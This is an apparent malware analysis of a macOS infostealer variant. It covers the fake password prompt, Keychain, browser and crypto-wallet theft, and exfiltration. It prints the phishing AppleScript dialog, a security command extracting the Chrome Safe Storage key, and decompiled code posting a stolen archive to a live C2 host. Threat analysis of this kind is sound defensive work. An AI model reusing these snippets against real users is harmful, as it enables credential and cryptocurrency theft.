TL;DR
#

The sample is a Go-based variant of Atomic macOS Stealer (AMOS), built as a universal binary for Intel and Apple Silicon. After execution it obtains the user’s password through a fake authentication prompt, collects credentials, cryptocurrency wallets, browser data and documents into an in-memory ZIP archive, sends it via an HTTP POST request to amos-malware[.]ru, and terminates after displaying a fake application error message.

Its targets are the Keychain system store, five desktop cryptocurrency wallets (Electrum, Coinomi, Exodus, Atomic Wallet, Binance), 54 browser crypto extensions, eight browsers (seven Chromium builds and Firefox), and files with the extensions .txt, .rtf, .key, .wallet, .private, .secret on the desktop and in the documents folder. Combined with the password obtained in the first step, the exfiltrated archive allows offline decryption of the Keychain container, the Chromium password databases, and wallet seed phrases.

Capabilities
#

GUI phishing prompt
#

At the very start the sample obtains the macOS account password by showing the user a fake authentication window. First it retrieves the username via os.Getenv("USER") and then checks whether the account is password-protected using the dscl utility:

1dscl /Local/Default -authonly <user> ""

If a password is set, a phishing window masquerading as System Preferences is displayed.

1display dialog "MacOS wants to access System Preferences
2%s
3Please enter your password." ¬
4    with title "System Preferences" ¬
5    with icon file "System:Library:CoreServices:CoreTypes.bundle:Contents:Resources:ToolbarAdvanced.icns" ¬
6    default answer "" ¬
7    giving up after 30 ¬
8    with hidden answer

The entered password is verified with the same dscl call, this time with the real value. If the password is incorrect, the dialog is shown again. The validated password is written to the archive as a separate file named password-entered. The archive is built in the process memory using archive/zip.NewWriter, which receives a bytes.Buffer, file copying is handled by the main_write function.

Keychain store theft
#

After obtaining the password, the sample attempts to steal the Keychain. Physically it is stored in the file login.keychain-db in the user’s profile folder, encrypted with the account password, so the sample copies this file into the archive and named it as login-keychain:

1  v2 = runtime_concatstring3(0, "/Users/", 7, main_user, *(&main_user + 1), "/Library/Keychains/login.keychain-db", 36);
2  return main_write(v2, v3, "login-keychain", 14);

Together with the password, this grants full access to the contents of the store: website and application passwords, certificates, authentication tokens, and so on.

On systems where the account has no password, a different branch the dialog is not shown and the Keychain container is not copied, instead the sample extracts the Chrome Safe Storage key from it. This is the key with which Chromium encrypts its password and cookie databases. The result is saved to the archive under the path Chromium/Chrome/Local State.

1security 2>&1 > /dev/null find-generic-password -ga 'Chrome' | awk '{print $2}'

Cryptocurrency wallet data theft
#

After the credentials, the sample moves on to collecting cryptocurrency wallets. Its targets are Electrum, Coinomi, Exodus, Atomic Wallet and Binance.

For Electrum, Coinomi, Exodus and Atomic Wallet the sample takes entire contents of the directory. It retrieves the name of each file and copies it into the archive under the path Wallets/<wallet>/<file>.

Browser data theft
#

The sample steals data from Chrome, Brave, Edge, Vivaldi, Yandex, Opera, Opera GX and Firefox.

Chromium

For each Chromium browser a recursive traversal of its directory tree is performed using filepath.Walk() with the callback function main_GrabChrome_func1, which locates and copies into the archive:

  • Cookies
  • Login Data with saved logins and passwords
  • Web Data with autofill data
  • Local Extension Settings, the directory holding installed extension data

Having found the Local Extension Settings directory with the extension data, the sample reads its contents and compares the name of each extension against a built-in list of 54 crypto extension IDs, copying matches into the archive for exfiltration.

File collection
#

The sample searches for and copies into the archive files with the extensions .txt, .rtf, .key, .wallet, .private, .secret from the desktop and the documents folder.

1mw_filegrabber_exts = strings_Split(".txt,.rtf,.key,.wallet,.private,.secret", ",");

The search is performed across two directories, ~/Desktop/ and ~/Documents/. Files from the desktop go into the archive under the prefix FileGrabber/, and those from the documents folder under FileGrabber/doc_.

System information collection
#

The sample also collects data about the infected machine. It executes system_profiler SPHardwareDataType command. This command returns data about the device model, model identifier, processor type and core count, memory size, serial number and hardware UUID. The command output is written to the archive under the name Sysinfo.txt:

Exfiltration
#

After collection, all the data is encoded in base64 and sent via an HTTP POST request to the domain amos-malware.ru at the sendlog endpoint.

1v26       = archive_zip__ptr_Writer_Close(main_writer);
2data      = bytes__ptr_Buffer_Bytes(main_buf);
3data_bs64 = encoding_base64__ptr_Encoding_EncodeToString(encoding_base64_URLEncoding, ...);
4//  ...[snip]...
5return net_http_PostForm("http://amos-malware.ru/sendlog", 30, &v22);

Three additional fields are inserted into the request:

1runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "BuildID", 7);   // main_buildid
2runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "user", 4);      // main_userlog
3runtime_mapassign_faststr(&RTYPE_net_url_Values, &v22, "B64", 3);       // archive in base64
4
5return net_http_PostForm("http://amos-malware.ru/sendlog", 30, &v22);

The B64 field contains the entire archive of stolen data. The other two fields are populated from global variables:

1_main_buildid   = "UNICEF"
2_main_userlog   = "Holocaust"

the C2 server was confirmed live. A test POST request received an HTTP/1.1 200 OK response from 34.41.139.193 (Google Cloud Platform), served by nginx. server-side input checking.

After exfiltration, the user is shown a fake application error message. The user sees an ordinary launch failure and has no reason to look for outside activity. The sample terminates at this point.

Attribution
#

Based on the combination of the domain name, functional overlap, and infrastructure model, the sample is assessed with moderate confidence as belonging to the Atomic macOS Stealer (AMOS) family or a closely derived variant.

The domain amos-malware[.]ru directly references the AMOS brand. The collected data categories — Keychain container, Chrome Safe Storage key, browser credential databases, cryptocurrency wallet files, and a filegrabber targeting the same six extensions — match the publicly documented AMOS capability set precisely
